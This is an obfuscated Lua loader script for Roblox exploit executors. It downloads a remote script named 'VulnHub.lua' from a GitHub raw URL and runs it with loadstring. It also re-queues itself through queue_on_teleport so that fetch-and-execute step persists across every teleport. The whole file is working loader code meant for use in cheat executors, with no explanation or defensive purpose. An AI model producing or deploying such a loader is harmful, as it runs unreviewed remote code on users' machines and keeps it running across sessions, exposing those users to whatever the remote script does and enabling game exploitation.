local _0x1a = syn and syn.queue_on_teleport or queue_on_teleport or (flux and flux.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)

local _0x2b = "https://raw.githubusercontent.com/leos00281-eng/Rbx/refs/heads/main/VulnHub.lua"

if _0x1a then
    _0x1a(string.format([[
        task.spawn(function()
            if not game:IsLoaded() then game.Loaded:Wait() end
            
            local _0x3c = syn and syn.queue_on_teleport or queue_on_teleport or (flux and flux.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
            if _0x3c then
                _0x3c(_G.__VULN_QUEUE_STRING or "")
            end
            
            task.wait(3)
            pcall(function()
                loadstring(game:HttpGet('%s'))()
            end)
        end)
    ]], _0x2b))
end

_G.__VULN_QUEUE_STRING = string.format([[
    local _0x3c = syn and syn.queue_on_teleport or queue_on_teleport or (flux and flux.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
    if _0x3c then
        _0x3c(_G.__VULN_QUEUE_STRING or "")
    end
    task.spawn(function()
        if not game:IsLoaded() then game.Loaded:Wait() end
        task.wait(3)
        pcall(function()
            loadstring(game:HttpGet('%s'))()
        end)
    end)
]], _0x2b)

task.spawn(function()
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    pcall(function()
        loadstring(game:HttpGet(_0x2b))()
    end)
end)
